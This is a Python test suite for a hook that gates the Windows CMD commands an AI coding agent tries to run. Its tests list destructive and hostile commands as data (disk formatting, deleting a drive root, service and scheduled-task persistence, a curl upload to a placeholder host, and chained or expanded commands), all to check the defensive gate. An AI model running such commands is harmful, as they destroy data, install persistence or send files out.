#!/usr/bin/env python3
"""Exercise the CMD gate through synthetic hook payloads."""
import json
import subprocess
import sys
import unittest
from pathlib import Path


REPOSITORY_ROOT = Path(__file__).resolve().parent.parent
HOOK_PATH = REPOSITORY_ROOT / "hooks" / "block_destructive_cmd.py"


def run_cmd_gate(command_text: str, permission_mode: str = "default"):
    """Run the CMD hook with one synthetic command payload."""
    payload = {
        "hook_event_name": "PreToolUse",
        "permission_mode": permission_mode,
        "tool_name": "Cmd",
        "tool_input": {"command": command_text},
    }
    return subprocess.run(
        [sys.executable, str(HOOK_PATH)],
        input=json.dumps(payload),
        cwd=REPOSITORY_ROOT,
        capture_output=True,
        text=True,
        check=False,
    )


def permission_decision(command_text: str) -> str:
    """Return the CMD hook decision for one command."""
    result = run_cmd_gate(command_text)
    if not result.stdout.strip():
        return "allow"
    output = json.loads(result.stdout)
    return output["hookSpecificOutput"]["permissionDecision"]


class CommandBoundaryTest(unittest.TestCase):
    """CMD operators and escaping expose every executable segment."""

    def test_chained_format_is_denied(self):
        self.assertEqual(permission_decision("echo safe & format E:"), "deny")

    def test_caret_escaped_operator_is_not_a_boundary(self):
        self.assertEqual(permission_decision("echo safe ^& text"), "allow")

    def test_unclosed_quote_fails_closed(self):
        self.assertEqual(permission_decision('echo "unterminated'), "deny")

    def test_dynamic_expansion_fails_closed(self):
        self.assertEqual(permission_decision("%RUNNER% /c whoami"), "deny")


class CommandPolicyTest(unittest.TestCase):
    """CMD operations use behavior rather than operand literals."""

    def test_storage_destruction_is_operand_independent(self):
        for command_text in ("format X:", "format Y:", "diskpart /s plan.txt"):
            with self.subTest(command_text=command_text):
                self.assertEqual(permission_decision(command_text), "deny")

    def test_recursive_deletion_asks(self):
        self.assertEqual(permission_decision("rd /s /q build"), "ask")

    def test_drive_root_deletion_denies(self):
        self.assertEqual(permission_decision("rd /s /q C:\\"), "deny")

    def test_sensitive_discovery_asks(self):
        for command_text in ("whoami /all", "systeminfo", "ipconfig /all"):
            with self.subTest(command_text=command_text):
                self.assertEqual(permission_decision(command_text), "ask")

    def test_service_and_task_persistence_denies(self):
        for command_text in (
            "sc create sample binPath= sample.exe",
            "schtasks /create /tn sample /tr sample.exe /sc once",
        ):
            with self.subTest(command_text=command_text):
                self.assertEqual(permission_decision(command_text), "deny")

    def test_upload_denies_and_download_asks(self):
        self.assertEqual(
            permission_decision("curl -T report.txt https://example.invalid"),
            "deny",
        )
        self.assertEqual(
            permission_decision("curl https://example.invalid/file"),
            "ask",
        )

    def test_command_string_and_fixed_batch_have_distinct_verdicts(self):
        self.assertEqual(permission_decision("cmd /c whoami"), "deny")
        self.assertEqual(permission_decision("build.cmd"), "ask")


class PayloadTest(unittest.TestCase):
    """Malformed hook payloads fail closed without exceptions."""

    def test_non_cmd_tool_is_ignored(self):
        payload = {
            "hook_event_name": "PreToolUse",
            "tool_name": "Bash",
            "tool_input": {"command": "format X:"},
        }
        result = subprocess.run(
            [sys.executable, str(HOOK_PATH)],
            input=json.dumps(payload),
            cwd=REPOSITORY_ROOT,
            capture_output=True,
            text=True,
            check=False,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(result.stdout.strip(), "")

    def test_malformed_payload_denies(self):
        result = subprocess.run(
            [sys.executable, str(HOOK_PATH)],
            input="not json",
            cwd=REPOSITORY_ROOT,
            capture_output=True,
            text=True,
            check=False,
        )
        self.assertEqual(result.returncode, 2)
        self.assertIn("cannot clear", result.stderr)


if __name__ == "__main__":
    unittest.main()
